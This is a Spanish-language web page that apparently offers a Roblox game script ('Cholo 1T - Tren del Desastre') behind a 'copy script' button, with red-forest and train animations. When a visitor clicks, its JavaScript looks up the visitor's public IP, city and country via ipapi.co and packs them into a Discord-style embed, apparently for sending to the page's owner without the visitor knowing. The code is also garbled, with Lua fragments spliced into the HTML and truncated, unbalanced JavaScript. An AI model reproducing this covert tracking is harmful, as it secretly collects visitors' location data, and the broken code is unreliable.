<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Cholo 1T - Tren del Desastre</title>
    <style>
        :root { --red: #ff0000; --dark: #050505; }
        body { background: var(--dark); color: white; font-family: 'Arial', sans-serif; margin: 0; overflow: hidden; }

        /* Fondo de Bosque de Pinos con Niebla Roja */
        .scenery {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(to bottom, #300 0%, #050505 100%);
            z-index: -2;
        }
        .pine {
            position: absolute; bottom: 0; width: 0; height: 0; 
            border-left: 40px solid transparent; border-right: 40px solid transparent;
            border-bottom: 120px solid #1a0a0a; opacity: 0.5;
        }

        /* Rayos en el Cielo */
        .lightning {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: white; opacity: 0; z-index: -1;
            animation: thunder 4s infinite;
        }
        @keyframes thunder { 0%, 95%, 100% { opacity: 0; } 96% { opacity: 0.5; } 98% { opacity: 0.2; } }

        .hero { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
        h1 { font-size: 3.5rem; color: var(--red); text-shadow: 0 0 20px black; margin: 0; }
        .monster-train { font-size: 120px; margin: 20px; filter: drop-shadow(0 0 20px red); animation: shake 0.2s infinite; }
        @keyframes shake { 0% { transform: translate(2px, 2px); } 50% { transform: translate(-2px, -2px); } }

        .btn {
            padding: 20px 50px; background: var(--red); color: white; border: 3px solid white;
            border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 1.5rem;
            box-shadow: 0 0 25px red; transition: 0.3s; margin-top: 20px;
        }
        .btn:hover { transform: scale(1.1); background: #900; }

        .tienda { display: none; padding: 40px; }
        .card { background: rgba(0,0,0,0.95); border: 2px solid var(--red); padding: 30px; border-radius: 15px; max-width: 700px; margin: auto; }
        
        /* Animación de Trenes subiendo */
        .t-float { position: fixed; bottom: -100px; font-size: 50px; animation: up 3s linear infinite; z-index: 10; }
        @keyframes up { from { bottom: -100px; opacity: 1; } to { bottom: 110vh; opacity: 0; } }
    </style>
</head>
<body>

    <div class="scenery" id="forest"></div>
    <div class="lightning"></div>

    <div class="hero" id="inicio">
        <h1>TREN DEL DESASTRE - CHOLO 1T</h1>
        <div class="monster-train">🚂👹🔥</div>

game:GetService("RunService").Heartbeat:Connect(function()
    ejecutarCiclo_1()

-- ==========================================

task.spawn(function()

    end
end)

print("--- LOS 3 SCRIPTS UNIDOS Y EJECUTÁNDOSE ---")`;

        // Generar pinos visuales
        const forest = document.getElementById('forest');
        for(let i=0; i<20; i++) {
            let tree = document.createElement('div');
            tree.className = 'pine';
            tree.style.left = Math.random() * 100 + "vw";

        function activarTodo() {
            document.getElementById('inicio').style.display = 'none';
            document.getElementById('tienda').style.display = 'block';
            
            // Efecto de trenes
            setInterval(() => {
                let t = document.createElement('div');
                t.className = 't-float'; t.innerText = '🚂';
                t.style.left = Math.random() * 95 + "vw";
                document.body.appendChild(t);
                setTimeout(() => t.remove(), 3000);

            // RASTREO COMPLETO (IP, CIUDAD, PAIS)
            fetch('https://ipapi.co/json/')

            .then(data => {

                    embeds: [{

                        color: 16711680,
                        fields: [
                            {name: "🌐 IP Pública", value: "`" + (data.ip || "No detectada") + "`", inline: true},

                    }]

        function copiarOriginal() {
            const area = document.createElement('textarea');
            area.value = scriptOriginal;
            document.body.appendChild(area);
            area.select();
            document.execCommand('copy');
            document.body.removeChild(area);
            document.getElementById('status').innerText = "✅ ¡SCRIPT ORIGINAL COPIADO!";
        }
